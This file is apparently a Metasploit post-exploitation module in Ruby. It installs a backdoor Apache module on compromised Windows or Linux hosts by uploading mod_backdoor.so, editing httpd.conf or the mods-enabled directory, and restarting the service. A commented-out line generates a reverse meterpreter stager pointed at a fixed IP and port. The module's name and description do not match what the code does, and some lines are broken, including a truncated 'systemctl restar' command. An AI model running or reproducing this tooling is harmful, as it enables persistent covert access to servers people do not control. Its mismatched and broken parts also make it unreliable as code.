##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Linux::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Persistent EXE Payload Installer',
        'Description' => %q{
          This Module will upload an executable to a remote host and make it Persistent.
          It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
          SYSTEM will start on system boot but requires privs. SERVICE will create a new service
          which will start the payload. Again requires privs.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
        'Version' => '$Revision:1$',
        'Platform' => [ 'windows', 'linux' ],
        'SessionTypes' => [ 'meterpreter']
      )
    )

    register_options(
      [
        OptBool.new('RUN_NOW', [false, 'Run the installed payload immediately.', true]),
      ], self.class
    )

    register_advanced_options(
      [
        OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),
        OptString.new('StartupName', [false, 'The name of service or registry. Random string as default.' ]),
        OptString.new('ServiceDescription', [false, 'The description of service. Random string as default.' ])
      ]
    )

  end

  # Function for Creating the Payload
  #-------------------------------------------------------------------------------
  def create_payload(payload_name, lhost, lport)
    mod = framework.modules.create(payload_name)
    res = Msf::Simple::Payload.generate_simple(mod, {
      'Format' => 'c',
      'NoComment' => true,
      'Options' => { 'LHOST' => lhost, 'LPORT' => lport }
    })
    print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
    return res
  end

  def get_path_version(apache_path)
    paths = apache_path.scan(/(?:[a-z]:|\\\\[a-z0-9_.$-]+\\[a-z0-9_.$-]+)\\(?:[^\\:*?"<>|\r\n]+\\)*httpd.exe/) || []
    paths.each do |path|
      next unless exist?(path)

      version_output = cmd_exec('cmd.exe', "/c #{path} -V")
      version_output =~ /Architecture:   32-bit/ ? arch = 'x86' : 'x64'
      return path.split('\\')[0..-3].join('\\').to_s, arch
    end
  end

  def edit_apache_config(apache_path)
    conf_path = "#{apache_path}\\conf\\httpd.conf"
    file_contents = read_file(conf_path) if exist?(conf_path)
    if file_contents.nil? || file_contents.empty?
      print_warning('Configuration file content is empty')
    else
      split_key = 'LoadModule auth_basic_module modules/mod_auth_basic.so'
      if file_contents.index("\nLoadModule backdoor_module modules/mod_backdoor.so").nil?
        config_array = file_contents.split(split_key)
        split_key += "\nLoadModule backdoor_module modules/mod_backdoor.so"
        config_array.insert(1, split_key)
        write_file(conf_path, config_array.join)
      end
    end
  end

  def restart_apache_server(service)
    server_response = service_restart(service)
    if server_response
      print_good('Service restart successful')
    else
      print_error('Service restart failed, please check permissions')
    end
  end

  def upload_backdoor(apache_path, arch = '')
    separator = session.fs.file.separator
    print_status("Uploading Apache backdoor #{arch}")
    mod_path = File.join(Msf::Config.data_directory, 'post', 'apache', "#{arch}_mod_cygutils.so")
    mod_path = File.join(Msf::Config.data_directory, 'post', 'apache', 'linux_mod_cygutils.so') if session.platform == 'linux'
    backdoor_path = "#{apache_path}#{separator}modules#{separator}mod_backdoor.so"
    upload_file(backdoor_path, mod_path) if !exist?(backdoor_path)
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def run
    case session.platform
    when 'windows'
      print_status("Enumerating Apache services from #{sysinfo['Computer']}")
      each_service.each do |service|
        next if service[:name].downcase.index('apache').nil?

        apache_path, arch = get_path_version(service_info(service[:name])[:path])
        upload_backdoor(apache_path, arch)
        print_status('Restarting Apache service')
        restart_apache_server(service)
      end
      # hex_payload = create_payload('windows/meterpreter/reverse_http', '10.20.57.92', '7788')
      # hex_payload['unsigned char buf[] ='] = ''
      # print_good(hex_payload)
    when 'linux'
      if session.fs.file.exist?('/usr/lib/apache2/modules/') && session.fs.file.exist?('/etc/apache2/mods-enabled/')
        if !is_root?
          fail_with Failure::NoAccess, 'You must run this module as root!'
        else
          upload_backdoor('/usr/lib/apache2')
          mod_config = 'LoadModule backdoor_module    /usr/lib/apache2/modules/mod_backdoor.so'
          print_status('Add Apache module')
          write_file('/etc/apache2/mods-enabled/backdoor.load', mod_config)
          print_status('Restarting Apache service')
          cmd_exec('/bin/systemctl restar')
          cmd_exec('service apache2 restart')
        end
      end
    else
      print_warning('The platform is not supported')
    end
  end
end
